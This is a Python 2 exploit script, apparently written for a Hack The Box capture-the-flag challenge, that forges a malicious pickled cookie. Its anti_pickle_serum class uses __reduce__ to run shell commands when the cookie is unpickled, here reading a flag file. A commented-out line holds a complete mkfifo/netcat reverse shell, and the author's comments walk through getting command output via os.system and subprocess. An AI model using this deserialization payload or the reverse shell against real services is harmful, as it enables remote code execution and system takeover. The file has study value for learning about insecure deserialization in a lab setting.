import cPickle
import os
from base64 import b64encode
import subprocess
#import base64
#AttributeError: Can't get attribute 'anti_pickle_serum' on <module '__main__' from '/home/kali/CTF-Archive/htb/owasp_top_10/baby_wbsite_rick/unpickle.py'>
# This means that we need to create a variable anti_pickle_serum
#anti_pickle_serum = 'test'

#TypeError: object.__new__(X): X is not a type object (str)
# I tried string, bool and int. Lets create a anti_pickle_serum object type
#cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')

class anti_pickle_serum(object):
    def __reduce__(self):               # function called by the pickler
        return subprocess.check_output, (['cat','flag_wIp1b'],)


#code = 'KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu'
#rick = pickle.loads(b64decode(code))
# return -> {'serum': <__main__.anti_pickle_serum object at 0x7fd95c590730>}

# Huh, that looks nothing like the original cookie value (which starts with KGRwMApTJ3)... maybe we missed something with the dumps?
# checking dumps() documentation(https://docs.python.org/3/library/pickle.html#pickle.dumps) it takes 6 different protocols(https://docs.python.org/3/library/pickle.html#data-stream-format)
# Lets try each protocol until we have a string that it is similar to the one we grab from the website
# Usign the protocol 0 we have a similar string whoami -> KGRwMApWc2VydW0KcDEKY3Bvc2l4CnN5c3RlbQpwMgooKGxwMwpWd2hvYW1pCnA0CmF0cDUKUnA2CnMu
if __name__ == '__main__':
    shellcode = cPickle.dumps({"serum": anti_pickle_serum()}, protocol=0)
    print(b64encode(shellcode))


# if AttributeError: module 'pickle' has no attribute 'dumps'
# change the file name

# Python3 does not work here, it pickles different and we should use python2

# After executing the whoami command using return os.system, ('whoami',)
# we notice we get a 0 instead of the output, to parse the output we should use the subprocess.checkoutput

#  Using subprocess.check_output, (['whaomi'],) will execute the command and will parse the output of the process